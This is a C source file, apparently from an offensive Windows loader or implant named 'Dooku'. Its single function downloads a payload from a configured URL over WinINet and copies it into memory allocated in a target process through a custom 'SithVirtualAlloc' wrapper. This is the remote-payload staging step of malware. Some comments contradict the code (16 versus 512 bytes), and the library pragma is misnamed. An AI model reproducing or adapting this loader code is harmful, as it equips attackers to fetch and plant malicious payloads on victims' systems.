//
// Created by j4ck on 10/13/23.
//

#include "Http.h"
#include "Dooku.h"
#include <stdio.h>
#include <wchar.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininit.lib")

#define PAYLOAD_SIZE 512

PVOID FetchPayload(IN HANDLE hProcess, IN OUT PSIZE_T psSize) {
    PVOID lpBuffer = NULL;
    HINTERNET	hInternet = NULL;
    HINTERNET   hInternetFile = NULL;

    DWORD		dwBytesRead = 0;

    SIZE_T      pBytesSize = 0;
    PBYTE		pBytes = NULL; // Used as the total payload heap buffer
    PBYTE		pTmpBytes = NULL; // Used as the temp buffer of size 16 bytes

    // Opening an internet session handle
    hInternet = InternetOpenW(NULL, 0, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        return NULL;
    }

    // Opening a handle to the payload's URL
    hInternetFile = InternetOpenUrlW(hInternet, Instance->url, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        return NULL;
    }

    // Allocating 16 bytes to the temp buffer
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 512);
    if (pTmpBytes == NULL) {
        return NULL;
    }

    while (TRUE) {

        // Reading 16 bytes to the temp buffer
        // InternetReadFile will read less bytes in case the final chunk is less than 16 bytes
        if (!InternetReadFile(hInternetFile, pTmpBytes, 512, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            return NULL;
        }

        // Updating the size of the total buffer
        pBytesSize += dwBytesRead;

        // In case the total buffer is not allocated yet
        // then allocate it equal to the size of the bytes read since it may be less than 16 bytes
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            // Otherwise, reallocate the pBytes to equal to the total size, sSize.
            // This is required in order to fit the whole payload
            pBytes = (PBYTE)LocalReAlloc(pBytes, pBytesSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            return NULL;
        }

        // Append the temp buffer to the end of the total buffer
        memcpy((PVOID)(pBytes + (pBytesSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        // Clean up the temp buffer
        memset(pTmpBytes, '\0', dwBytesRead);

        // If less than 16 bytes were read it means the end of the file was reached
        // Therefore exit the loop
        if (dwBytesRead < 512) {
            break;
        }
        // Otherwise, read the next 16 bytes
    }

    *psSize = pBytesSize;
    NTSTATUS status = Instance->SithVirtualAlloc(hProcess, &lpBuffer, 0, &pBytesSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        wprintf(L"Failed to Allocate Memory! %X\n", status);
    }

    memcpy(lpBuffer, pBytes, *psSize);

    // Clean up
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    LocalFree(pTmpBytes);
    LocalFree(pBytes);
    return lpBuffer;
}
